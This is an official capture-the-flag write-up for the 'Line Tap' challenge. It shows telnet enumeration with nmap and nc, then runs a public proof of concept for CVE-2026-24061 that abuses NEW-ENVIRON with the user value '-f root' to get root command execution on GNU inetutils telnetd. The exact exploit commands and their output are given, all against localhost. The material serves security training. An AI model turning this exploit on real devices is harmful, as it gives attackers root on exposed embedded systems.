![img](../../assets/banner.png)

<img src="../../assets/htb.png" style="margin-left: 20px; zoom: 80%;" align=left />        <font size="10">Line Tap</font>

5<sup>th</sup> June 2026

Prepared By: Lean

Challenge Author(s): Lean

Difficulty: <font color=green>Easy</font>

Classification: Official

# [Synopsis](#synopsis)

Discover the telnet interface, exploit CVE-2026-24061, and achieve RCE on GNU inetutils telnetd.

## Description

Stormbound scouts found a forgotten RiverGate PLC beneath Crownspire brineworks, still feeding treated water toward the Ash Vault service tunnels. Vaultrune wardens cut its controller off from normal oversight after the Signet shattered, but old maintenance habits tend to leave traces. Find what still answers and recover the latest checkpoint token before another sealed gate obeys a forged writ.

## Skills Required

- Basic TCP service enumeration
- Basic understanding of legacy remote access services
- Ability to run a public proof of concept tool
- Basic Linux shell enumeration

## Skills Learned

- Recognizing a telnet maintenance surface
- Confirming command execution context after exploitation

## Application Overview

The target exposes one legacy remote maintenance service. It behaves like an embedded appliance access path rather than a web application, so the first task is careful TCP enumeration and protocol identification.

## Exploitation

### Step 1 - Confirm The Telnet Surface

Start by identifying what is exposed on the target port, for this writeup we assume that the exposed port is `2323`.

Manual enumeration before exploiting:

```bash
nmap -sT -sV -Pn -p 2323 127.0.0.1
```

Useful output:

```text
PORT     STATE SERVICE VERSION
2323/tcp open  telnet  Openwall GNU/*/Linux telnetd
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

This confirms the exposed service is telnet. A plain TCP probe also shows telnet option negotiation bytes rather than an HTTP response or custom text menu.

Minimal TCP check:

```bash
printf "\r\n" | nc -v -w 3 127.0.0.1 2323 | xxd -g 1 -l 64
```

Useful output:

```text
Connection to 127.0.0.1 port 2323 [tcp/*] succeeded!
00000000: ff fd 18 ff fd 20 ff fd 23 ff fd 27 ff fd 24
```

The `ff fd` bytes are telnet negotiation commands, which supports trying telnet-specific tooling instead of treating the service as a line-based TCP prompt.

### Step 2 - Run The Public CVE PoC

A dangerous CVE was released that affected a great number of embedded devices running telnet, CVE-2026-24061, so check if the device is vulnerable.

Manual validation before running the PoC:

```bash
git clone https://github.com/balgan/CVE-2026-24061.git
cd CVE-2026-24061
python3 exploit.py -p 2323 -c "id" 127.0.0.1
```

Successful output:

```text
[*] Connected to 127.0.0.1:2323
[*] Negotiating TELNET options...
[*] Agreed to NEW-ENVIRON and prepared USER value -f root
[+] Sent USER value -f root via NEW-ENVIRON
[*] Executing command: id
uid=0(root) gid=0(root) groups=0(root)
```

This confirms the exploit worked and that commands execute as root.

### Step 3 - Enumerate The Shell

Do not assume the target path or flag location before checking the shell context and filesystem.

Manual enumeration before reading files:

```bash
python3 exploit.py -p 2323 -c "id; whoami; pwd; hostname; ls -la /; find / -maxdepth 2 -type f -name flag\\* 2>/dev/null" 127.0.0.1
```

Useful output:

```text
uid=0(root) gid=0(root) groups=0(root)
root
/root
-r-------- 1 root root 27 Jun  1 05:30 flag.txt
/flag.txt
```

This confirms the exploit is already sufficient for local file access.

### Step 4 - Read The Flag

After confirming root context and locating the flag file, read it directly.

Manual validation before extracting the flag:

```bash
python3 exploit.py -p 2323 -c "ls -l /flag.txt" 127.0.0.1
```

Useful output:

```text
-r-------- 1 root root 27 Jun  1 05:30 /flag.txt
```

Shell command:

```bash
python3 exploit.py -p 2323 -c "cat /flag.txt" 127.0.0.1
```

Successful output:

```text
HTB{REDACTED}
```

The challenge is complete once the public telnet PoC produces root command execution.
